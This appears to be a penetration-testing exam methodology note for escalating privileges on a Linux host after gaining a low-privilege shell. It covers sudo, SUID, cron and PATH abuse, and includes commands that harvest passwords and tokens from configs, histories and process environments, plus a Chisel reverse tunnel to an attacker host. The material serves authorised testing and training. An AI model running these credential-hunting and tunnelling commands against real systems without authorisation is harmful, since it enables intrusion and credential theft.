# Linux Privilege Escalation Methodology

Follow this after landing a low-privilege Linux shell. The goal is a justified root path, not a noisy checklist dump. Confirm every finding manually, capture the user flag before PE, and capture the elevated flag immediately after successful PE.

## 0. Baseline and evidence

```bash
whoami; id; groups; hostname
uname -a; cat /etc/os-release
ip addr; ip route; ss -tulpen
sudo -l
```

Record the exact output, current working directory, shell type, reachable interfaces, and local listeners. Read the exam's user flag now (`local.txt` or the instructed path) and record it before changing privileges. If `sudo -l` permits a command without a password, analyze that exact binary/script immediately while automated enumeration runs.

## 1. Manual and automated enumeration

Run one comprehensive enumerator and one lightweight cross-check if time permits; transfer via a method already available and keep the output on disk.

```bash
./linpeas.sh | tee /tmp/linpeas.txt
./lse.sh -l1
./pspy64
```

Read the output rather than treating highlights as proof. Verify permissions, effective user, command arguments, service account, trigger conditions, and whether the path is actually reachable. See [Linux Privilege Escalation](Privilege%20Escalation/Linux%20Privilege%20Escalation.md) for tools and detailed exploit recipes.

## 2. Fast paths, in evidence order

### 2.1 Sudo rights

```bash
sudo -l
```

For every permitted command, inspect its arguments, environment, writable inputs, and version. Check the exact binary against GTFOBins' sudo context. Verify whether `NOPASSWD`, `SETENV`, wildcard arguments, or a custom script meaningfully change the available action. Prefer a narrow documented command over a kernel exploit.

### 2.2 Credential reuse and local credential artifacts

Inspect readable shell histories, app/database configs, `.env`, `.git` history, cron/systemd units, scripts, backups, SSH keys/config/known_hosts, `.netrc`, `.pgpass`, KeePass databases, browser stores, Docker/AWS credentials, and process `cmdline`/`environ`. Search app directories and likely homes before a full-disk grep. Check credentials against local `su`, `sudo -l -U`, SSH, databases, and discovered in-scope hosts; keep username/domain context.

```bash
find / -type f \( -name '*.conf' -o -name '*.ini' -o -name '*.env' -o -name '*.yml' -o -name '*.xml' -o -name '*.bak' -o -name '*.old' \) 2>/dev/null
cat ~/.bash_history ~/.zsh_history ~/.ssh/config ~/.netrc 2>/dev/null
grep -riE 'password|passwd|secret|token|credential' /etc /var/www /opt /home /var/backups 2>/dev/null
for p in /proc/[0-9]*; do tr '\0' ' ' < "$p/cmdline" 2>/dev/null; tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -iE 'pass|secret|token|key'; done
```

If a DB is exposed locally, check app configs and client files for credentials. For PostgreSQL, use [PostgreSQL](Enumeration/PostgreSQL.md) and verify role rights before attempting `COPY FROM PROGRAM`; for MySQL, confirm the user and file privileges before file-write/UDF paths.

### 2.3 SUID/SGID and capabilities

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

Compare unusual binaries with the standard OS set. For a known binary, check the SUID or capability-specific GTFOBins entry (not the sudo entry). For a custom executable, inspect ownership/permissions and use `strings`, `file`, `checksec`, or offline analysis to identify a concrete path flaw. Verify the shell's effective UID after exploitation.

### 2.4 Cron, systemd, timers, and PATH

```bash
cat /etc/crontab; ls -la /etc/cron.*; crontab -l 2>/dev/null
systemctl list-timers --all
find /etc /opt /usr/local /var/www -type f -writable 2>/dev/null
```

Use `pspy` or process observation to confirm a privileged job actually runs. Read every referenced script and check its owner, writable parent directories, executable paths, environment, and arguments. Branch only when the finding is real:

- Writable root-run script/config: modify only the relevant line and wait for or trigger the documented schedule.
- Relative command or weak service `PATH`: confirm which directory wins and that it is writable before testing a controlled replacement.
- Wildcard passed to `tar`/similar: confirm current directory, glob behavior, and execution context before using the documented wildcard technique.
- Writable systemd unit/drop-in: prove service owner, restart capability, and restart impact before changing it.

### 2.5 Writable sensitive files, NFS, and service configuration

Check `/etc/passwd`, `/etc/shadow`, sudoers include files, service binaries/configuration, mounted shares, and `/etc/exports` for actual write access. From the attacker, enumerate NFS exports with `showmount -e <target>`; only consider the SUID binary route if the share is writable and the export explicitly has `no_root_squash`. Confirm the target-side binary and privilege behavior.

### 2.6 Docker/container and local services

```bash
cat /proc/1/cgroup 2>/dev/null; ls -la /.dockerenv 2>/dev/null
id; groups
ss -tulpen; netstat -tulnp 2>/dev/null
```

If in a container, establish its capabilities, mounts, Docker socket access, and host relationship before testing an escape. For a local-only web/DB service, identify its process/version and credentials. On a standalone target, use **Chisel** for internal port forwarding; do not use Ligolo-ng for this standalone-machine workflow.

```bash
# Attacker: reverse-capable server
chisel server -p 9999 --reverse

# Compromised target: forward its loopback service back to attacker port 8888
./chisel client <attacker-ip>:9999 R:8888:127.0.0.1:<internal-port>
```

Connect to `127.0.0.1:8888` on the attacker and enumerate the forwarded service. Check the exact Chisel syntax/version and ensure the listener binds where intended. SSH local/dynamic forwarding is another option when SSH credentials are available. See [Pivoting and Port Forwarding](Lateral%20Movement/Pivoting%20%26%20Port%20Forwarding.md).

### 2.7 Kernel and service exploits: last resort

Collect exact kernel, distribution, package, and service versions. Match a specific local vulnerability and prerequisites; review the exploit and assess crash risk before execution. Prefer a manual config/credential path first. Record why the affected build matches the exploit rather than relying on a suggested-CVE scanner result.

## 3. Exploit, verify, capture

Before running a local exploit, preserve its source/output and establish that the candidate path is writable/triggerable. Use the least disruptive proof that demonstrates privilege. Then:

1. Verify `id` shows UID 0 (or the exact intended elevated identity), and verify hostname.
2. Immediately read the elevated flag (`proof.txt`, `root.txt`, or exam-instructed path); record its exact value and evidence.
3. Record the command and enumeration output that justified the path, plus any changes made.
4. Check for local-only services and credentials that could support the next in-scope host; do not assume the same password/hash works elsewhere.
5. Do not install persistence or leave long-lived access unless the exam explicitly requires it. The persistence notes are reference material, not default exam steps.

## Source notes

- [Linux Privilege Escalation](Privilege%20Escalation/Linux%20Privilege%20Escalation.md)
- [Linux Credential Hunting](Password%20Attacks/Credential%20Hunting%20on%20Linux.md)
- [File Transfers](File%20Transfers/File%20Transfers.md)
- [Initial Foothold](initial-foothold.md)
- [Port Scanning](Enumeration/Port%20Scanning.md)
- [Common Ports](Enumeration/Common%20Ports.md)
- [Common Ports II](Enumeration/Common%20Ports%20II.md)
- [PostgreSQL](Enumeration/PostgreSQL.md)
- [Pivoting and Port Forwarding](Lateral%20Movement/Pivoting%20%26%20Port%20Forwarding.md)
- [Linux Persistence](Persistence/Linux%20Persistence.md)
